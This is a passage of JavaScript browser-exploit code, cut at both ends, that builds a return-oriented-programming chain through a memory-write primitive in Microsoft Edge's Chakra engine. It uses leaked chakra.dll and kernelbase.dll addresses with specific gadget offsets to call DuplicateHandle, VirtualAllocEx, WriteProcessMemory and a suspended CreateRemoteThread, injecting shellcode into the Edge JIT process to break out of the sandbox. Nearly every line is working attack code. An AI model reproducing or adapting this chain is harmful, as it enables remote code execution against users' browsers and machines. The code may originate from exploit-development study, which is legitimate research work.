	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();

	// LPHANDLE lpTargetHandle (R9)
	// This needs to be a writable address where the full JIT handle will be stored
	// Using .data section of chakra.dll in a part where there is no data
	/*
	0:053> dqs chakra+0x72E000+0x20010
	00007ffc`052ae010  00000000`00000000
	00007ffc`052ae018  00000000`00000000
	*/
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// HANDLE hSourceProcessHandle (RCX)
	// Handle to the JIT process from the content process
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
	next();

	// Call KERNELBASE!DuplicateHandle
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
	next(); 
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
	next();

	// VirtuaAllocEx() ROP chain
	// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

	// DWORD flAllocationType (R9)
	// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
	/*
	0:031> ? 0x00002000 | 0x00001000 
	Evaluate expression: 12288 = 00000000`00003000
	*/
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// SIZE_T dwSize (R8)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
	next();

	// LPVOID lpAddress (RDX)
	// Let VirtualAllocEx decide where the memory will be located
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
	next();

	// HANDLE hProcess (RCX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
	next();                                                                     				   // Recall RAX already has a writable pointer in it

	// Call KERNELBASE!VirtualAllocEx
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();

	// WriteProcessMemory() ROP chain
	// Stage 3 -> Write our shellcode into the JIT process

	// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

	/*
	0:015> dq kernelbase+0x216000+0x4000 L2
	00007fff`58cfa000  00000000`00000000 00000000`00000000
	*/
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
	next();

	// SIZE_T nSize (R9)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// HANDLE hProcess (RCX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
	next();                                                                     // Recall RAX already has a writable pointer in it

	// LPVOID lpBaseAddress (RDX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
	next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);       // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
	next();

	// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
	next();

	// Call KERNELBASE!WriteProcessMemory
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
	next();

	// CreateRemoteThread() ROP chain
	// Stage 4 -> Create a thread within the JIT process, but create it suspended
	// This will allow the thread to _not_ execute until we are ready
	// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
	// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
	// We will update the thread later via another ROP chain to call SetThreadContext()

	// LPTHREAD_START_ROUTINE lpStartAddress (R9)
	// This can be any random data, since it will never be executed
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// HANDLE hProcess (RCX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
	next();

	// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
	next();

	// SIZE_T dwStackSize (R8)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
	next();

	// Call KERNELBASE!CreateRemoteThread
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
	next(); 
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
	next();

	// WriteProcessMemory() ROP chain (Number 2)
    // Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget and pop rdi gadget
    // Comments about this occur at the beginning of the VirtualProtect ROP chain we will inject into the JIT process

    // Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
    next();

    // SIZE_T nSize (R9)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
    next();

    // HANDLE hProcess (RCX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
    next();

    // LPVOID lpBaseAddress (RDX)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
    next();                                                                       

    // LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
    next();

    // Call KERNELBASE!WriteProcessMemory
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();
    write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
    next();

    // WriteProcessMemory() ROP chain (Number 3)
	// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

	// SIZE_T nSize (R9)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
	next();

	// HANDLE hProcess (RCX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
	next();

	// LPVOID lpBaseAddress (RDX)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
	next();                                                                       

	// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
	next();

	// Call KERNELBASE!WriteProcessMemory
	write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
	next();
	write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
	next();
